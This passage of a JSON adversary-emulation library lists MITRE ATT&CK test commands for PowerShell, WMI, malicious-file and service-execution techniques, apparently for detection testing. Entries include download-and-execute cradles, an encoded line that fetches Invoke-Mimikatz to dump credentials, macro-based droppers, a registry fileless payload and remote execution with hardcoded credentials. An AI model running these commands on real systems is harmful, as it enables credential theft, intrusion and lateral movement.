         "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n",
         "command": "Try {;     New-PSSession -ComputerName $env:COMPUTERNAME -ErrorAction Stop | Out-Null;      ; } ; Catch {;     Enable-PSRemoting; };  ;  New-PSSession -ComputerName $env:COMPUTERNAME; Test-Connection $env:COMPUTERNAME; Set-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"; Get-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use; Remove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
         "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"; try { Invoke-BloodHound -OutputDirectory $env:Temp }; catch { $_; exit $_.Exception.HResult}; Start-Sleep 5"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
         "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\""
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n",
         "command": "reg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "PowerShell",
         "tactic": "defense-evasion",
         "description": "Copy powershell to non-standard location and perform triage commands",
         "command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "collection",
         "description": "User enumeration",
         "command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "collection",
         "description": "System Information Gathering Script",
         "command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Kill all PowerShell processes",
         "command": "Get-Process -Name \"powershell\" | Stop-Process\n"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Run an application as a different user",
         "command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Download",
         "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Emulate administrator tasks on a system in a separate process",
         "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Download",
         "command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"
      }
   ],
   "T1047": [
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n",
         "command": "wmic /node:127.0.0.1 process call create \"rundll32.exe \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll\\\" StartW\""
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n",
         "command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\")); $NewClass = $Class.Derive(\"Win32_Atomic\"); $NewClass.Put(); Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n",
         "command": "wmic process get caption,executablepath,commandline /format:csv"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n",
         "command": "wmic qfe get description,installedOn /format:csv"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n",
         "command": "wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process call create notepad.exe"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.",
         "command": "wmic /node:\"127.0.0.1\" product where \"name like 'Tightvnc%%'\" call uninstall"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n",
         "command": "wmic process call create notepad.exe"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the \u2013EncodedCommand, once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019 -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n",
         "command": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreachable\n",
         "command": "wmic /node:\"127.0.0.1\" service where (caption like \"%Spooler%\")"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n",
         "command": "wmic useraccount get /ALL /format:csv"
      },
      {
         "technique_id": "T1047",
         "technique_name": "WMIC",
         "tactic": "collection",
         "description": "Capture process id, executable path, pid and parent pid before writing to disk",
         "command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"
      },
      {
         "technique_id": "T1047",
         "technique_name": "Windows Management Instrumentation",
         "tactic": "execution",
         "description": "Remotely executes 54ndc47 over WMI",
         "command": "$node = '''#{remote.host.fqdn}''';\n$user = '''#{domain.user.name}''';\n$password = '''#{domain.user.password}''';\nwmic /node:$node /user:$user /password:$password process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n"
      }
   ],
   "T1204.002": [
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macroCode = Get-Content \"#{macro_path}\" -Raw; $URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"; Invoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\""
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\""
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\""
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
         "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"; $file1 = \"$env:Temp\\test10.lnk\"; Start-Process $file1; Start-Sleep -s 10; taskkill /IM a.exe /F"
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\""
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "Uses cscript //E:jscript to download a file\n",
         "command": "echo var url = \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js && cscript //E:Jscript %TEMP%\\OSTapGet.js"
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n",
         "command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"; $fname1 = \"$env:TEMP\\procexp.exe\"; if (Test-Path $fname) {;   Remove-Item $fname;   Remove-Item $fname1; }; $xlApp = New-Object -COMObject \"Excel.Application\"; $xlApp.Visible = $True; $xlApp.DisplayAlerts = $False; $xlBook = $xlApp.Workbooks.Add(); $sheet = $xlBook.Excel4MacroSheets.Add(); if (\"$env:Username\" -ne \"\") {;   $sheet.Cells.Item(1,1) = \"$env:Username\"; } else {;   $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"; }; $sheet.Cells.Item(2,1) = \"procexp.exe\"; $sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"; $sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"; $sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"; $sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"; $sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"; $sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"; $sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"; $sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"; $sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"; $sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"; $sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"; $sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"; $sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"; $sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"; $sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"; $sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"; $sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"; $sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"; $sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"; $sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"; $sheet.Cells.Item(23,1) = \"=HALT()\"; $sheet.Cells.Item(1,1).Name = \"runme\"; $xlApp.Run(\"runme\"); $xlApp.Quit(); [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null; [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null; [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers(); Remove-Variable xlBook; Remove-Variable xlApp"
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. \nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n",
         "command": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"; New-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null; & '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\""
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\""
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"$(\"$env:temp\\art1204.bat\")`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c $bat_path `\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct Word"
      },
      {
         "technique_id": "T1204.002",
         "technique_name": "User Execution: Malicious File",
         "tactic": "execution",
         "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n",
         "command": "Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe; & \"$env:TEMP/PotentiallyUnwanted.exe\""
      }
   ],
   "T1569.002": [
      {
         "technique_id": "T1569.002",
         "technique_name": "System Services: Service Execution",
         "tactic": "execution",
         "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -u DOMAIN\\Administrator -p P@ssw0rd1 -accepteula \"C:\\Windows\\System32\\calc.exe\""
      },
      {
         "technique_id": "T1569.002",
         "technique_name": "System Services: Service Execution",
         "tactic": "execution",
         "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n",
         "command": "sc.exe create ARTService binPath= \"%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" && sc.exe start ARTService && sc.exe delete ARTService"
      },
      {
         "technique_id": "T1569.002",
         "technique_name": "System Services: Service Execution",
         "tactic": "execution",
         "description": "Requires having RemCom installed, path to RemCom is one of the input input_arguments\nWill start a process on a remote host.\nUpon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\" \\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe"
      },
      {
         "technique_id": "T1569.002",
         "technique_name": "System Services: Service Execution",
         "tactic": "execution",
         "description": "Will execute a command on the remote host with Impacket psexec.py script.\n",
         "command": "psexec.py '/Administrator:P@ssw0rd1@127.0.0.1' 'whoami'"
      },
      {
         "technique_id": "T1569.002",
         "technique_name": "System Services: Service Execution",
         "tactic": "execution",
         "description": "The following Atomic Test will create a new service named WerFaultSvc with a binary path of WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe.\nThis was recently seen in the Snake Malware report. \nUpon execution, sc.exe will create a new service named WerFaultSvc with a bin path \\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe and a display name of WerFault Service.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
         "command": "sc.exe create \"WerFaultSvc\" binPath= \"$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\" DisplayName= \"WerFault Service\" start= auto"
      },
      {
         "technique_id": "T1569.002",
         "technique_name": "System Services: Service Execution",
         "tactic": "execution",
         "description": "This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat",
         "command": "if (Test-Path \"C:\\Users\\puma-4\\Desktop\\PsExec.exe\") { ; } else {Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"C:\\Users\\puma-4\\Desktop\\PsTools.zip\"; Expand-Archive \"C:\\Users\\puma-4\\Desktop\\PsTools.zip\" \"C:\\Users\\puma-4\\Desktop\\PsTools\" -Force; New-Item -ItemType Directory (Split-Path \"C:\\Users\\puma-4\\Desktop\\PsExec.exe\") -Force | Out-Null; Copy-Item \"C:\\Users\\puma-4\\Desktop\\PsExec.exe\" \"C:\\Users\\puma-4\\Desktop\\PsExec.exe\" -Force}; ; cmd.exe /c \"wmic \\tcsproduct \\tget UUID\" ; cmd.exe /c \"fsutil behavior \\tset SymlinkEvaluation R2L:1\" ; cmd.exe /c \"fsutil behavior set \\tSymlinkEvaluation R2R:1\"; reg add HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f ; copy \"C:\\Users\\puma-4\\Desktop\\PsExec.exe\" $env:temp; cmd.exe /c \"$env:temp\\\\psexec.exe -accepteula \\\\\\\\$ENV:COMPUTERNAME cmd.exe /c echo \"--access-token\"\""
      },
      {
         "technique_id": "T1569.002",
         "technique_name": "System Services: Service Execution",
         "tactic": "execution",
         "description": "Create a service named \"sandsvc\" to execute remote 54ndc57 binary named \"s4ndc4t.exe\"",
         "command": "sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= \"cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}\" displayname= \"Sandcat Execution\";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;\n"
      }
   ],
   "T1059.006": [
      {
